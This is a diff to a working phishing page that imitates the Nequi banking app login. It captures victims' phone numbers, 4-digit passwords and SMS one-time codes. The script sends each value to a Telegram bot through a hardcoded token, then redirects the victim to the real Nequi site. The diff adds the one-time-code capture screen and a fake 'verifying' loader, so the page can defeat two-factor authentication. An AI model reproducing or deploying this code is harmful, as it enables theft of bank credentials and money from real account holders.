@@ -13,7 +13,6 @@
       background: #1F0829;
       height: 100vh; 
       color: white;
-      overflow: hidden;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -28,11 +27,9 @@
       overflow: hidden;
     }
 
-    /* ==================== PANTALLA 1 ==================== */
-    #screen1, #screen2 {
+    #screen1, #screen2, #screen3, #loader {
       position: absolute;
-      top: 0;
-      left: 0;
+      top: 0; left: 0;
       width: 100%;
       height: 100%;
       padding: 20px;
@@ -57,20 +54,17 @@
     }
 
     .nequi-logo {
-      margin-top: 90px;
+      margin-top: 85px;
       font-size: 58px;
       font-weight: 700;
       text-align: center;
       color: white;
     }
-    .nequi-logo span {
-      color: #FF2D95;
-      margin-right: 8px;
-    }
+    .nequi-logo span { color: #FF2D95; margin-right: 8px; }
 
     .label {
       text-align: center;
-      margin: 80px 0 35px 0;
+      margin: 70px 0 35px 0;
       font-size: 17.5px;
       color: #D8B5E8;
     }
@@ -113,7 +107,6 @@
       box-shadow: 0 6px 20px rgba(255, 45, 149, 0.4);
     }
 
-    /* ==================== PANTALLA 2 ==================== */
     .back {
       position: absolute;
       top: 25px;
@@ -131,22 +124,21 @@
     }
 
     .pins {
-      margin: 60px 0 35px 0;
+      margin: 55px 0 35px 0;
       display: flex;
       justify-content: center;
-      gap: 22px;
+      gap: 20px;
     }
     .pin {
-      width: 55px;
-      height: 55px;
+      width: 52px;
+      height: 52px;
       background: #E0B0FF;
-      border-radius: 12px;
+      border-radius: 10px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 32px;
+      font-size: 28px;
       color: #3C0A55;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
     }
 
     .message {
@@ -162,8 +154,8 @@
       margin-bottom: 30px;
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 20px 40px;
-      padding: 0 20px;
+      gap: 18px 35px;
+      padding: 0 25px;
       font-size: 34px;
     }
     .key {
@@ -177,62 +169,110 @@
     }
     .key:active { background: rgba(255,255,255,0.25); }
     .delete { font-size: 26px !important; }
+
+    /* ==================== LOADER ==================== */
+    #loader {
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid rgba(255,45,149,0.2);
+      border-top: 5px solid #FF2D95;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 25px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loader-text {
+      font-size: 18px;
+      color: #E0B0FF;
+    }
   </style>
 </head>
 <body>
 
   <div class="phone-frame">
 
-    <!-- Pantalla 1 -->
+    <!-- Pantalla 1: Número -->
     <div id="screen1">
       <div class="help">?</div>
       <div class="nequi-logo"><span>■</span>Nequi</div>
       <div class="label">Ingresa tu número de celular</div>
-      
       <div class="input-box">
         <input type="tel" id="phone" placeholder="300 123 4567" maxlength="10" inputmode="numeric">
       </div>
-
       <button onclick="goToPassword()">Entra</button>
     </div>
 
-    <!-- Pantalla 2 -->
+    <!-- Pantalla 2: Clave 4 dígitos -->
     <div id="screen2" style="display:none;">
-      <div class="back" onclick="goBack()">←</div>
+      <div class="back" onclick="goBack(1)">←</div>
       <div class="title">Escribe tu clave</div>
-
-      <div class="pins" id="pins">
-        <div class="pin"></div>
-        <div class="pin"></div>
-        <div class="pin"></div>
-        <div class="pin"></div>
+      <div class="pins" id="pins4">
+        <div class="pin"></div><div class="pin"></div><div class="pin"></div><div class="pin"></div>
       </div>
-
-      <div class="message">
-        No dudamos que seas tú...<br>
-        Pero es mejor confirmar ;)
-      </div>
-
+      <div class="message">No dudamos que seas tú...<br>Pero es mejor confirmar ;)</div>
       <div class="keyboard">
-        <div class="key" onclick="addDigit(1)">1</div>
-        <div class="key" onclick="addDigit(2)">2</div>
-        <div class="key" onclick="addDigit(3)">3</div>
-        <div class="key" onclick="addDigit(4)">4</div>
-        <div class="key" onclick="addDigit(5)">5</div>
-        <div class="key" onclick="addDigit(6)">6</div>
-        <div class="key" onclick="addDigit(7)">7</div>
-        <div class="key" onclick="addDigit(8)">8</div>
-        <div class="key" onclick="addDigit(9)">9</div>
+        <div class="key" onclick="addDigit(1,4)">1</div>
+        <div class="key" onclick="addDigit(2,4)">2</div>
+        <div class="key" onclick="addDigit(3,4)">3</div>
+        <div class="key" onclick="addDigit(4,4)">4</div>
+        <div class="key" onclick="addDigit(5,4)">5</div>
+        <div class="key" onclick="addDigit(6,4)">6</div>
+        <div class="key" onclick="addDigit(7,4)">7</div>
+        <div class="key" onclick="addDigit(8,4)">8</div>
+        <div class="key" onclick="addDigit(9,4)">9</div>
         <div class="key"></div>
-        <div class="key" onclick="addDigit(0)">0</div>
-        <div class="key delete" onclick="deleteDigit()">✕</div>
+        <div class="key" onclick="addDigit(0,4)">0</div>
+        <div class="key delete" onclick="deleteDigit(4)">✕</div>
       </div>
+    </div>
+
+    <!-- Pantalla 3: Clave Dinámica -->
+    <div id="screen3" style="display:none;">
+      <div class="back" onclick="goBack(2)">←</div>
+      <div class="title">Clave Dinámica</div>
+      <div class="pins" id="pins6">
+        <div class="pin"></div><div class="pin"></div><div class="pin"></div>
+        <div class="pin"></div><div class="pin"></div><div class="pin"></div>
+      </div>
+      <div class="message">Ingresa el código de 6 dígitos<br>que te enviamos por SMS</div>
+      <div class="keyboard">
+        <div class="key" onclick="addDigit(1,6)">1</div>
+        <div class="key" onclick="addDigit(2,6)">2</div>
+        <div class="key" onclick="addDigit(3,6)">3</div>
+        <div class="key" onclick="addDigit(4,6)">4</div>
+        <div class="key" onclick="addDigit(5,6)">5</div>
+        <div class="key" onclick="addDigit(6,6)">6</div>
+        <div class="key" onclick="addDigit(7,6)">7</div>
+        <div class="key" onclick="addDigit(8,6)">8</div>
+        <div class="key" onclick="addDigit(9,6)">9</div>
+        <div class="key"></div>
+        <div class="key" onclick="addDigit(0,6)">0</div>
+        <div class="key delete" onclick="deleteDigit(6)">✕</div>
+      </div>
+    </div>
+
+    <!-- Loader -->
+    <div id="loader">
+      <div class="spinner"></div>
+      <div class="loader-text">Verificando información...</div>
     </div>
 
   </div>
 
   <script>
-    let pin = "";
+    let currentPin = "";
+    let currentScreen = 1;
+    let phoneNumber = "";
     const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
     const chatId = "773351137";
 
@@ -242,35 +282,52 @@
         alert("Por favor ingresa un número válido");
         return;
       }
+      phoneNumber = phone;
       localStorage.setItem("phone", phone);
-      document.getElementById("screen1").style.display = "none";
-      document.getElementById("screen2").style.display = "flex";
+      showScreen(2);
     }
 
-    function addDigit(num) {
-      if (pin.length < 4) {
-        pin += num;
+    function showScreen(screen) {
+      document.getElementById("screen1").style.display = "none";
+      document.getElementById("screen2").style.display = "none";
+      document.getElementById("screen3").style.display = "none";
+      document.getElementById("loader").style.display = "none";
+
+      if (screen === "loader") {
+        document.getElementById("loader").style.display = "flex";
+      } else {
+        document.getElementById("screen" + screen).style.display = "flex";
+        currentScreen = screen;
+        currentPin = "";
         updatePins();
-        if (pin.length === 4) sendData();
       }
     }
 
-    function deleteDigit() {
-      pin = pin.slice(0, -1);
+    function addDigit(num, length) {
+      if (currentPin.length < length) {
+        currentPin += num;
+        updatePins();
+        if (currentPin.length === length) sendData();
+      }
+    }
+
+    function deleteDigit(length) {
+      currentPin = currentPin.slice(0, -1);
       updatePins();
     }
 
     function updatePins() {
-      const boxes = document.querySelectorAll('#pins .pin');
+      let selector = currentScreen === 2 ? "#pins4" : "#pins6";
+      const boxes = document.querySelectorAll(selector + ' .pin');
       boxes.forEach((box, i) => {
-        box.textContent = i < pin.length ? "●" : "";
+        box.textContent = i < currentPin.length ? "●" : "";
       });
     }
 
     function sendData() {
-      const phone = localStorage.getItem("phone") || "Sin número";
-
-      const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 Clave: ${pin}\n⏰ ${new Date().toLocaleString('es-CO')}`;
+      const tipo = currentScreen === 2 ? "Clave Principal" : "Clave Dinámica";
+      
+      const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 ${tipo}: ${currentPin}\n⏰ ${new Date().toLocaleString('es-CO')}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -278,16 +335,20 @@
         body: JSON.stringify({ chat_id: chatId, text: message })
       });
 
+      showScreen("loader");
+
       setTimeout(() => {
-        window.location.href = "https://www.nequi.com.co";
-      }, 1500);
+        if (currentScreen === 2) {
+          showScreen(3);           // Ir a Clave Dinámica
+        } else {
+          window.location.href = "https://www.nequi.com.co";
+        }
+      }, 2200);
     }
 
-    function goBack() {
-      document.getElementById("screen2").style.display = "none";
-      document.getElementById("screen1").style.display = "flex";
-      pin = "";
-      updatePins();
+    function goBack(from) {
+      if (from === 2) showScreen(1);
+      if (from === 3) showScreen(2);
     }
   </script>
 </body>
